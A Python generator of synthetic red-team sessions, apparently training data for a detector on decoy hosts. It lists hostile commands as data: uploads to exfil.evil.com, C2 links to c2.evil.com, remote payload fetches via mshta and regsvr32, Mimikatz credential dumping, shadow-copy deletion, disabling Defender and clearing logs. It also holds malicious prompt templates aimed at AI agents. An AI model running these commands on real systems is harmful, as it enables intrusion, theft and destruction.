"""Red team scenario generator: C1-C7 with agent profiles."""

from __future__ import annotations
import argparse
import json
import random
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Literal
import numpy as np
import pyarrow as pa
import pyarrow.parquet as pq

from aag_be.features import SessionFingerprint, CommandEvent, NetworkEvent, FileEvent, LLMInteraction


# ─── Agent Profiles ───

AGENT_PROFILES = {
    "AutoGPT-RaaS": {
        "llm_models": ["gpt-4", "gpt-3.5-turbo", "claude-3-opus"],
        "prompt_style": "goal-oriented",
        "tool_use": "high",
        "adaptability": "high",
        "typical_mitre": ["T1584", "T1585", "T1190", "T1059", "T1021", "T1005", "T1486", "T1041"],
        "lolbins": ["powershell", "wmic", "certutil", "vssadmin", "bcdedit", "wbadmin"],
    },
    "BabyAGI-CaaS": {
        "llm_models": ["gpt-4", "llama-2-70b", "mixtral-8x7b"],
        "prompt_style": "task-decomposition",
        "tool_use": "medium",
        "adaptability": "medium",
        "typical_mitre": ["T1583", "T1585", "T1110", "T1555", "T1078", "T1021"],
        "lolbins": ["curl", "python", "sqlmap", "hydra", "medusa", "ssh"],
    },
    "Custom-LLM-Agent": {
        "llm_models": ["custom", "llama-3-70b", "nemotron-3-ultra"],
        "prompt_style": "react",
        "tool_use": "very_high",
        "adaptability": "very_high",
        "typical_mitre": ["T1584", "T1583", "T1190", "T1059", "T1021", "T1005", "T1567"],
        "lolbins": ["bash", "python", "go", "kubectl", "terraform", "ansible", "kubectl"],
    },
    "FraudGPT": {
        "llm_models": ["fraudgpt", "wormgpt", "darkbert"],
        "prompt_style": "social-engineering",
        "tool_use": "low",
        "adaptability": "high",
        "typical_mitre": ["T1566", "T1598", "T1585", "T1583", "T1656"],
        "lolbins": ["curl", "python", "mshta", "regsvr32", "powershell"],
    },
    "WormGPT": {
        "llm_models": ["wormgpt", "darkgpt", "poison-gpt"],
        "prompt_style": "malware-generation",
        "tool_use": "medium",
        "adaptability": "high",
        "typical_mitre": ["T1587", "T1588", "T1190", "T1059", "T1027", "T1562"],
        "lolbins": ["python", "gcc", "nasm", "metasploit", "msfvenom", "powershell"],
    },
}


# ─── Scenario Definitions ───

SCENARIOS = {
    "C1": {
        "name": "Recon-to-Initial-Access",
        "description": "Automated reconnaissance leading to exploit",
        "phases": [
            ("recon", ["T1590", "T1592", "T1598"], 0.3),
            ("weaponization", ["T1587", "T1588"], 0.2),
            ("delivery", ["T1566", "T1190"], 0.3),
            ("exploitation", ["T1190", "T1068"], 0.2),
        ],
    },
    "C2": {
        "name": "Credential-Stuffing-Adaptive",
        "description": "Adaptive credential stuffing with ML-based password mutation",
        "phases": [
            ("recon", ["T1590", "T1592"], 0.2),
            ("credential_access", ["T1555", "T1110", "T1003"], 0.5),
            ("lateral_movement", ["T1021", "T1550"], 0.3),
        ],
    },
    "C3": {
        "name": "LOLBin-Only-Lateral",
        "description": "Living-off-the-land lateral movement, no custom tools",
        "phases": [
            ("discovery", ["T1018", "T1082", "T1083", "T1087"], 0.3),
            ("lateral_movement", ["T1021", "T1550", "T1080"], 0.5),
            ("defense_evasion", ["T1070", "T1562"], 0.2),
        ],
    },
    "C4": {
        "name": "Neural-DGA-C2",
        "description": "Neural network generated DGA for C2 communication",
        "phases": [
            ("c2", ["T1573", "T1071", "T1090", "T1001"], 0.6),
            ("exfiltration", ["T1041", "T1048"], 0.4),
        ],
    },
    "C5": {
        "name": "Exfiltration-Poisoning",
        "description": "Data exfiltration with defensive data poisoning",
        "phases": [
            ("collection", ["T1005", "T1560"], 0.2),
            ("exfiltration", ["T1041", "T1048", "T1567"], 0.4),
            ("impact", ["T1485", "T1491"], 0.4),
        ],
    },
    "C6": {
        "name": "Polymorphic-Payload",
        "description": "LLM-generated polymorphic payloads evading signatures",
        "phases": [
            ("weaponization", ["T1587", "T1588", "T1027"], 0.4),
            ("delivery", ["T1566", "T1190"], 0.3),
            ("execution", ["T1059", "T1204"], 0.3),
        ],
    },
    "C7": {
        "name": "Vibe-Coding-Chain",
        "description": "Natural language to weaponized code chain",
        "phases": [
            ("resource_development", ["T1583", "T1584", "T1585"], 0.2),
            ("initial_access", ["T1566", "T1190"], 0.3),
            ("execution", ["T1059", "T1053"], 0.3),
            ("lateral_movement", ["T1021"], 0.2),
        ],
    },
}


# ─── Persona-Scenario Mapping ───

SCENARIO_AGENTS = {
    "C1": ["AutoGPT-RaaS", "Custom-LLM-Agent", "WormGPT"],
    "C2": ["BabyAGI-CaaS", "FraudGPT", "AutoGPT-RaaS"],
    "C3": ["Custom-LLM-Agent", "AutoGPT-RaaS", "WormGPT"],
    "C4": ["Custom-LLM-Agent", "WormGPT"],
    "C5": ["AutoGPT-RaaS", "Custom-LLM-Agent", "FraudGPT"],
    "C6": ["WormGPT", "Custom-LLM-Agent", "AutoGPT-RaaS"],
    "C7": ["Custom-LLM-Agent", "FraudGPT", "WormGPT", "AutoGPT-RaaS"],
}


DECOY_PERSONAS = [
    "LEGACY_WIN", "K8S_NODE", "CI_RUNNER", "IOT_GW", "DEV_WS", "CLOUD_FN"
]


def generate_llm_interaction(agent_profile: dict, phase: str, timestamp: float) -> LLMInteraction:
    """Generate a realistic LLM interaction."""
    model = random.choice(agent_profile["llm_models"])

    prompt_templates = {
        "recon": "Enumerate all services on target network 10.0.0.0/24",
        "weaponization": "Generate a PowerShell script that downloads and executes payload from C2",
        "delivery": "Craft a phishing email targeting IT admins with a malicious attachment",
        "exploitation": "Exploit CVE-2023-XXXX on the target Windows host",
        "credential_access": "Extract credentials from LSASS memory using only built-in tools",
        "discovery": "Map the Active Directory domain and find high-value targets",
        "lateral_movement": "Move laterally to the domain controller using Pass-the-Hash",
        "c2": "Establish a covert C2 channel using DNS tunneling",
        "collection": "Find and archive all documents containing 'password' or 'secret'",
        "exfiltration": "Exfiltrate collected data via HTTPS to avoid detection",
        "impact": "Encrypt all user files and delete shadow copies",
        "resource_development": "Create a GitHub repository with malicious workflow",
        "initial_access": "Exploit the public-facing web application",
        "execution": "Execute the payload via scheduled task",
        "defense_evasion": "Disable Windows Defender and clear event logs",
    }

    prompt = prompt_templates.get(phase, f"Perform {phase} activity")
    prompt_tokens = len(prompt.split()) * 1.3
    completion_tokens = random.randint(200, 2000)

    return LLMInteraction(
        timestamp=timestamp,
        prompt_tokens=int(prompt_tokens),
        completion_tokens=completion_tokens,
        model=model,
        prompt_hash=f"prompt_{hash(prompt) % 1000000:06x}",
        response_hash=f"resp_{hash(str(completion_tokens)) % 1000000:06x}",
        latency_ms=random.uniform(500, 5000),
        tool_calls=random.randint(0, 5) if agent_profile["tool_use"] != "low" else 0,
    )


def generate_command_for_phase(phase: str, agent_profile: dict, step: int) -> tuple[str, list[str], list[str]]:
    """Generate a command appropriate for the phase and agent."""
    lolbins = agent_profile["lolbins"]

    phase_commands = {
        "recon": [
            ("nmap", ["-sS", "-T4", "10.0.0.0/24"]),
            ("nmap", ["-sV", "--script", "vuln", "10.0.0.50"]),
            ("curl", ["-s", "http://10.0.0.50/robots.txt"]),
            ("dig", ["axfr", "@10.0.0.10", "corp.internal"]),
            ("ldapsearch", ["-x", "-H", "ldap://10.0.0.10", "-b", "dc=corp,dc=internal"]),
        ],
        "weaponization": [
            ("python", ["-c", "import base64; print(base64.b64encode(b'payload').decode())"]),
            ("msfvenom", ["-p", "windows/x64/meterpreter/reverse_https", "LHOST=10.0.0.100", "LPORT=443", "-f", "ps1"]),
            ("gcc", ["-shared", "-o", "payload.so", "payload.c", "-fPIC"]),
            ("powershell", ["-enc", "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0..."]),
        ],
        "delivery": [
            ("curl", ["-X", "POST", "-d", "@payload.exe", "http://target/upload"]),
            ("python", ["-m", "http.server", "8080"]),
            ("mshta", ["http://10.0.0.100/payload.hta"]),
            ("regsvr32", ["/s", "/n", "/u", "/i:http://10.0.0.100/payload.sct", "scrobj.dll"]),
        ],
        "exploitation": [
            ("python", ["exploit.py", "--target", "10.0.0.50"]),
            ("metasploit", ["-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.50; run"]),
            ("powershell", ["./Invoke-EternalBlue.ps1", "-Target", "10.0.0.50"]),
        ],
        "credential_access": [
            ("sekurlsa", ["::logonpasswords"]),
            ("powershell", ["Invoke-Mimikatz", "-Command", '"sekurlsa::logonpasswords"']),
            ("gsecdump", ["-u", "admin", "-p", "pass", "10.0.0.50"]),
            ("lsassy", ["-u", "admin", "-p", "pass", "-d", "corp", "10.0.0.50"]),
        ],
        "discovery": [
            ("powershell", ["Get-ADComputer", "-Filter", "*", "-Properties", "*"]),
            ("net", ["view", "/domain"]),
            ("whoami", ["/all"]),
            ("systeminfo", []),
            ("netstat", ["-ano"]),
        ],
        "lateral_movement": [
            ("psexec", ["\\\\10.0.0.50", "-u", "admin", "-p", "hash", "cmd"]),
            ("wmiexec", ["admin@10.0.0.50", "cmd"]),
            ("smbexec", ["admin@10.0.0.50"]),
            ("atexec", ["admin@10.0.0.50", "whoami"]),
            ("powershell", ["Enter-PSSession", "-ComputerName", "10.0.0.50", "-Credential", "$cred"]),
        ],
        "c2": [
            ("python", ["c2_client.py", "--domain", "c2.evil.com", "--interval", "30"]),
            ("powershell", ["Invoke-DNSTunnel", "-Domain", "c2.evil.com"]),
            ("ssh", ["-R", "8080:localhost:80", "user@c2.evil.com"]),
        ],
        "collection": [
            ("powershell", ["Get-ChildItem", "-Recurse", "-Path", "C:\\Users", "-Include", "*password*"]),
            ("find", ["/home", "-name", "*.key", "-o", "-name", "*.pem", "-o", "-name", "*.pfx"]),
            ("tar", ["-czf", "/tmp/loot.tar.gz", "/home/user/.ssh", "/home/user/.aws"]),
        ],
        "exfiltration": [
            ("curl", ["-X", "POST", "-F", "file=@/tmp/loot.tar.gz", "https://exfil.evil.com/upload"]),
            ("python", ["-c", "import requests; requests.post('https://exfil.evil.com', data=open('/tmp/loot.tar.gz','rb').read())"]),
            ("scp", ["/tmp/loot.tar.gz", "attacker@exfil.evil.com:/loot/"]),
        ],
        "impact": [
            ("vssadmin", ["delete", "shadows", "/all", "/quiet"]),
            ("wbadmin", ["delete", "systemstatebackup", "-keepVersions:0"]),
            ("bcdedit", ["/set", "{default}", "recoveryenabled", "No"]),
            ("cipher", ["/w", "C:\\"]),
        ],
        "resource_development": [
            ("git", ["clone", "https://github.com/attacker/repo"]),
            ("gh", ["repo", "create", "malicious-action", "--public"]),
            ("terraform", ["init"]),
        ],
        "initial_access": [
            ("curl", ["-X", "POST", "-d", "exploit_payload", "http://target/vuln-endpoint"]),
            ("sqlmap", ["-u", "http://target/page?id=1", "--batch", "--dbs"]),
        ],
        "execution": [
            ("schtasks", ["/create", "/tn", "Update", "/tr", "C:\\Temp\\payload.exe", "/sc", "onstart"]),
            ("powershell", ["Start-Process", "C:\\Temp\\payload.exe"]),
            ("wmic", ["process", "call", "create", "cmd /c payload.exe"]),
        ],
        "defense_evasion": [
            ("powershell", ["Set-MpPreference", "-DisableRealtimeMonitoring", "$true"]),
            ("wevtutil", ["cl", "Security"]),
            ("wevtutil", ["cl", "System"]),
            ("auditpol", ["/set", "/category:*", "/success:disable", "/failure:disable"]),
        ],
    }

    cmds = phase_commands.get(phase, [("echo", ["phase: " + phase])])
    exe, argv = random.choice(cmds)

    # Agent-specific mutations
    if agent_profile["adaptability"] in ("high", "very_high"):
        # Add obfuscation
        if random.random() < 0.3 and exe in ("powershell", "python", "bash"):
            if exe == "powershell":
                argv = ["-enc", "base64_encoded_command"] + argv
            elif exe == "python":
                argv = ["-c", "exec(base64.b64decode('...'))"]
            elif exe == "bash":
                argv = ["-c", "eval $(echo ... | base64 -d)"]

    mitre = random.choice(agent_profile["typical_mitre"])
    return exe, argv, [mitre]


def generate_scenario_session(
    scenario_id: str,
    scenario_config: dict,
    agent_name: str,
    session_num: int,
    start_ts: float,
) -> SessionFingerprint:
    """Generate a session for a specific scenario."""
    agent_profile = AGENT_PROFILES[agent_name]
    persona = random.choice(DECOY_PERSONAS)

    # Session duration based on scenario complexity
    n_phases = len(scenario_config["phases"])
    duration_min = random.uniform(30, 180)
    end_ts = start_ts + duration_min * 60

    commands = []
    network = []
    files = []
    llm_interactions = []
    mitre_techniques = []

    current_time = start_time = start_ts
    pid_counter = 2000 + session_num * 100

    for phase_name, phase_mitre, phase_weight in scenario_config["phases"]:
        phase_duration = duration_min * phase_weight * 60
        phase_end = current_time + phase_duration

        # Number of steps in this phase
        n_steps = random.randint(3, 10)

        for step in range(n_steps):
            if current_time >= phase_end:
                break

            think_time = random.uniform(1, 30)
            current_time += think_time

            # LLM interaction (agentic behavior)
            if random.random() < 0.7:  # High probability for agentic
                llm_interactions.append(generate_llm_interaction(agent_profile, phase_name, current_time))
                current_time += random.uniform(0.5, 5.0)

            # Generate command
            exe, argv, step_mitre = generate_command_for_phase(phase_name, agent_profile, step)
            mitre_techniques.extend(step_mitre)

            pid = pid_counter + step
            ppid = pid_counter if step > 0 else 1

            cmd_event = CommandEvent(
                timestamp=current_time,
                exe=exe,
                argv=argv,
                pid=pid,
                ppid=ppid,
                user="SYSTEM" if "ADMIN" in persona else "user",
                cwd="C:\\Windows\\Temp" if "WIN" in persona else "/tmp",
                exit_code=0 if random.random() > 0.1 else random.choice([1, 2, 5, 127]),
                duration_ms=random.uniform(50, 10000),
            )
            commands.append(cmd_event)

            # Network
            if random.random() < 0.5:
                dst_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
                dst_port = random.choice([80, 443, 8080, 8443, 53, 22, 445, 3389])
                net_event = NetworkEvent(
                    timestamp=current_time + random.uniform(0, 1),
                    src_ip="10.0.0.100",
                    dst_ip=dst_ip,
                    dst_port=dst_port,
                    protocol="tcp",
                    direction="out",
                    bytes_sent=random.randint(1000, 1000000),
                    bytes_recv=random.randint(1000, 1000000),
                    process_pid=pid,
                )
                network.append(net_event)

            # Files
            if random.random() < 0.3:
                ops = ["read", "write", "create", "exec"]
                op = random.choice(ops)
                paths = [
                    "C:\\Temp\\payload.exe", "/tmp/payload", "C:\\Users\\Public\\loot.tar.gz",
                    "/home/user/.ssh/id_rsa", "C:\\Windows\\Temp\\output.txt"
                ]
                file_event = FileEvent(
                    timestamp=current_time + random.uniform(0, 0.5),
                    path=random.choice(paths),
                    operation=op,
                    process_pid=pid,
                    is_honeyfile=False,
                )
                files.append(file_event)

            current_time += random.uniform(0.1, 2.0)

        current_time = phase_end

    # Add some honeyfile accesses (deception interaction)
    if random.random() < 0.4:
        for _ in range(random.randint(1, 3)):
            file_event = FileEvent(
                timestamp=current_time + random.uniform(0, 10),
                path="/decoy/credentials.txt" if random.random() < 0.5 else "C:\\Decoy\\config.xml",
                operation="read",
                process_pid=pid_counter,
                is_honeyfile=True,
            )
            files.append(file_event)

    return SessionFingerprint(
        session_id=f"redteam-{scenario_id}-{agent_name}-{session_num:04d}",
        start_ts=start_ts,
        end_ts=min(current_time, end_ts),
        src_ip="10.0.0.100",
        user_agent=random.choice(agent_profile["llm_models"]),
        decoy_persona=persona,
        commands=commands,
        network=network,
        files=files,
        llm_interactions=llm_interactions,
        mitre_techniques=list(set(mitre_techniques)),
    )


def sessions_to_table(sessions: list[SessionFingerprint]) -> pa.Table:
    """Convert sessions to PyArrow table."""
    data = {
        "session_id": [],
        "start_ts": [],
        "end_ts": [],
        "src_ip": [],
        "user_agent": [],
        "decoy_persona": [],
        "commands_json": [],
        "network_json": [],
        "files_json": [],
        "llm_json": [],
        "mitre_techniques": [],
        "agent_family": [],
        "agent_name": [],
    }

    for s in sessions:
        data["session_id"].append(s.session_id)
        data["start_ts"].append(s.start_ts)
        data["end_ts"].append(s.end_ts)
        data["src_ip"].append(s.src_ip)
        data["user_agent"].append(s.user_agent)
        data["decoy_persona"].append(s.decoy_persona)
        data["commands_json"].append(json.dumps([asdict(c) for c in s.commands]))
        data["network_json"].append(json.dumps([asdict(n) for n in s.network]))
        data["files_json"].append(json.dumps([asdict(f) for f in s.files]))
        data["llm_json"].append(json.dumps([asdict(l) for l in s.llm_interactions]))
        data["mitre_techniques"].append(",".join(s.mitre_techniques))
        # Extract agent name from session_id
        parts = s.session_id.split("-")
        data["agent_family"].append(parts[2] if len(parts) > 2 else "UNKNOWN")
        data["agent_name"].append(parts[3] if len(parts) > 3 else "UNKNOWN")

    return pa.Table.from_pydict(data)


def main():
    parser = argparse.ArgumentParser(description="Generate red team scenarios C1-C7")
    parser.add_argument("-n", "--per-scenario", type=int, default=1000)
    parser.add_argument("-o", "--output-dir", type=Path, required=True)
    parser.add_argument("--seed", type=int, default=1337)
    args = parser.parse_args()

    random.seed(args.seed)
    np.random.seed(args.seed)

    args.output_dir.mkdir(parents=True, exist_ok=True)

    all_sessions = []
    start_time = time.time()

    for scenario_id, scenario_config in SCENARIOS.items():
        agents = SCENARIO_AGENTS[scenario_id]
        sessions_per_agent = args.per_scenario // len(agents)

        print(f"Generating {scenario_id} ({scenario_config['name']})...")

        for agent_name in agents:
            for i in range(sessions_per_agent):
                session = generate_scenario_session(
                    scenario_id, scenario_config, agent_name, i,
                    start_time + len(all_sessions) * 100
                )
                all_sessions.append(session)

    # Write per-scenario files
    for scenario_id in SCENARIOS:
        scenario_sessions = [s for s in all_sessions if f"redteam-{scenario_id}-" in s.session_id]
        if scenario_sessions:
            output_file = args.output_dir / f"{scenario_id}.parquet"
            table = sessions_to_table(scenario_sessions)
            pq.write_table(table, output_file, compression="snappy")
            print(f"  Wrote {len(scenario_sessions)} sessions to {output_file}")

    print(f"Total sessions generated: {len(all_sessions)}")


if __name__ == "__main__":
    main()